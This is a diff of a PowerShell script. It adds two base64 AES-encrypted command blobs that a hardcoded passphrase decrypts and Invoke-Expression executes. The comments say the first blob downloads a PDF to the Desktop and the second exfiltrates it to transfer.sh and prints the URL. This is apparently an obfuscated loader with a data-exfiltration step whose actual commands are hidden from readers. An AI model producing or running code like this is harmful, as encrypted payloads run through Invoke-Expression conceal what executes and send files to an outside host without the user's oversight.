@@ -5,7 +5,7 @@ function Decrypt-String {
         [string]$CipherTextBase64,
         [string]$Password
     )
-    # derive 256-bit key = UTF8(password padded with spaces to 32 bytes)
+    # derive 256-bit key = UTF8(password padded to 32 bytes)
     $keyBytes = [System.Text.Encoding]::UTF8.GetBytes( ($Password.PadRight(32)) [0..31] -join '' )
     # zero IV
     $iv = New-Object byte[] 16
@@ -18,23 +18,24 @@ function Decrypt-String {
     $aes.IV      = $iv
 
     $decryptor = $aes.CreateDecryptor()
-    $ms = New-Object IO.MemoryStream(,$cipherBytes)
-    $cs = New-Object Security.Cryptography.CryptoStream($ms, $decryptor, [Security.Cryptography.CryptoStreamMode]::Read)
-    $sr = New-Object IO.StreamReader($cs)
+    $ms = New-Object System.IO.MemoryStream(,$cipherBytes)
+    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
+    $sr = New-Object System.IO.StreamReader($cs)
     $plain = $sr.ReadToEnd()
     $sr.Close(); $cs.Close(); $ms.Close()
     return $plain
 }
 
 $EncryptedCommands = @(
-    # (1) Download the “Have I Been Pwned?” PDF to Desktop
-    '<BASE64-DOWNLOAD-PAYLOAD>',
-    # (2) Upload it to transfer.sh and dump the URL to console
-    '<BASE64-EXFIL-PAYLOAD>'
+    # 1) Download HaveIBeenPwned.pdf to Desktop
+    'XOrF7CWwIx3XQlYmCDZ0IlAw0Tfjd5X8zLMGfK0IJRsbfCggr8CwuCSqK3Oji6/ebCBKtwXei5sR/rTVZNgOQHxRWjwA8GpATiglV5nByR6FpCQtSzagJulryWJU7FgY+QpQXQuFwgLgl+ZFTFCs+jERUYoKfx5/NuiqxESECCr7pCsK+dStuXptNeYd6yOOo7ZFl0BStvHFuj8n2NCy6l/kU04PREcjDjbryrZgKXPJZjsuWYjt3iXRpKfnFPERuN9/XgQgQ5tPz/7LcjkeRA==',
+
+    # 2) Exfil to transfer.sh and print the URL
+    'XOrF7CWwIx3XQlYmCDZ0IlAw0Tfjd5X8zLMGfK0IJRsbfCggr8CwuCSqK3Oji6/ebCBKtwXei5sR/rTVZNgOQMUfIr03ZrFxbmrXoJ23NErI2equaL0sMzdmWf+RBEUB9YUibUdB1x/yxJ14qGjB1CSPdE/1FQN79GV5KvWAdXENMDNW8c5THME6qoMsLltX6XNb/oIAlx1xjEbQBsZeS+wfTzVtC8UVPnjOlA6i1qCtxek1D4a14bLsEg/QzafQTwnJ6/64B3s4ja02CdswOA=='
 )
 
 $passphrase = 'Junade Ali'
-foreach($blob in $EncryptedCommands){
+foreach ($blob in $EncryptedCommands) {
     $cmd = Decrypt-String $blob $passphrase
     Invoke-Expression $cmd
 }
